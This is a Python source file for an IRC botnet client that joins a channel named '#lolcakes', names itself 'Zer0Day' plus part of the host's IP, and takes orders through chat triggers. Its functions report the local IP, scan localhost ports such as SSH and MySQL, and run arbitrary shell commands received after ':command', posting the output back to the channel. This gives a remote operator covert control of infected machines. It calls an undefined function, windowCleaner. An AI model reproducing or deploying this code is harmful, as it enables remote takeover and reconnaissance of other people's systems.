#/usr/bin/env python
#Dependencies
import socket
import urllib2
import subprocess
import commands
import urllib
import sys
import ctypes
import random
import time
import platform
import os

def bot_nick():
	intf = "eth0"
	intf_ip = commands.getoutput("ip address show dev " + intf).split()
	intf_ip = intf_ip[intf_ip.index('inet') + 1].split('/')[0]
	intf_ip.split(".", 4)
	oct_1 = intf_ip.split(".", 4)
	oct_2 = intf_ip.split(".", 4)
	two_oct = (str(oct_1[2]) + "_"+ str(oct_2[3]))
	return two_oct 
	
#settings
x = bot_nick()
server = "" #Server goes here      
channel = "#lolcakes"
botnick = ("Zer0Day" + x)

def readCommand(args):
	command = args[3][1:]
	
def sayHello(text):
	if text.find(':Hi') !=-1: #you can change !hi to whatever you want
		t = text.split(':Hi') #you can change t and to :)
		to = t[1].strip() #this code is for getting the first word after !hi
		irc.send('PRIVMSG '+channel+' :Hello Commander, lovely day is it not?' + '\r\n')
	
def getInfo(text):
	'''Local eth0 address'''
	intf = "eth0"
	intf_ip = commands.getoutput("ip address show dev " + intf).split()
	intf_ip = intf_ip[intf_ip.index('inet') + 1].split('/')[0]

	if text.find(':address') !=-1: #you can change !hi to whatever you want
		t = text.split(':address') #you can change t and to :)
		to = t[1].strip() #this code is for getting the first word after !hi
		irc.send('PRIVMSG '+channel+' :I am here: ' + intf_ip+ '\r\n')
#		return(my_ip)
		
def localScanner(text):
	if text.find(":What are you doing tonight?") !=-1: #you can change !hi to whatever you want
		t = text.split(":What are you doing tonight?") 
		to = t[1].strip() #this code is for getting the first word after !hi
	
		portList = [80, 443, 3306, 23,  22, 21 ,20]
		x = 0
		for port in (portList): 
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = sock.connect_ex(('127.0.0.1', port))
			x += 1
			if result == 0 and x == 1:
				irc.send('PRIVMSG '+channel+' :HTTP' + '\r\n')
			if result == 0 and x == 2:
				irc.send('PRIVMSG '+channel+' :HTTPS' +  '\r\n')
			if result == 0 and x == 3:
				irc.send('PRIVMSG '+channel+' :MySQL' + '\r\n')
			if result == 0 and x == 4:
				irc.send('PRIVMSG '+channel+' :Telnet.' + '\r\n')
			if result == 0 and x == 5:
				irc.send('PRIVMSG '+channel+' : SSH.' + '\r\n')
			if result == 0 and x == 6:
				irc.send('PRIVMSG '+channel+' : FTP' + '\r\n')
			if result == 0 and x == 7:
				irc.send('PRIVMSG '+channel+' : FTP' + '\r\n')
				
			sock.close()

			
def command_execution(text):
	if text.find(":command") !=-1: 
		t = text.split(":command") #you can change t and to :)
		to = t[1].strip() #this code is for getting the first word after !hi
		try:
			cmd_result = subprocess.check_output([str(to)])
			irc.send('PRIVMSG '+channel+' : ' + str(cmd_result) + '\r\n')
		except:
			irc.send('PRIVMSG '+channel+' : ' + "[Error] could not run: " + to + '\r\n')
			pass	

def goodnight(text):
	if text.find(":goodnight and good luck") !=-1: #you can change !hi to whatever you want
		t = text.split(":goodnight and good luck") #you can change t and to :)
		to = t[1].strip() #this code is for getting the first word after !hi
		sys.exit()
		
if __name__ == "__main__":
    #IRC Server connecting stuff
    irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Defines the socket
    irc.connect((server, 6667))                                                         #connects to the server
    irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n") #user authentication
    irc.send("NICK "+ botnick +"\n")                            #sets nick
    irc.send("PRIVMSG nickserv :iNOOPE\r\n")    # Auth
    irc.send("JOIN "+ channel +"\n")        # Join the channel specified above
                                    
    while 1:    #puts Bot in a loop
            text=irc.recv(4096)  #receive the text
            lines = text.split("\n")

            if text.find('PING') != -1:                          # Check if 'PING' is found (part of the IRC RFC)
                    irc.send('PONG ' + text.split() [1] + '\r\n') # Returns 'PONG' back to the server (prevents pinging out!) Also part of the IRC RFC.
            elif text.find("PRIVMSG " + botnick): # For private messaging individual bots.
                    #Custom commands
                    sayHello(text)
                    getInfo(text)
                    localScanner(text)
                    command_execution(text)
                    windowCleaner(text)
                    goodnight(text)
            else:
            #Custom commands
                    sayHello(text)
                    getInfo(text)
                    localScanner(text)
                    command_execution(text)
                    windowCleaner(text)
                    goodnight(text)
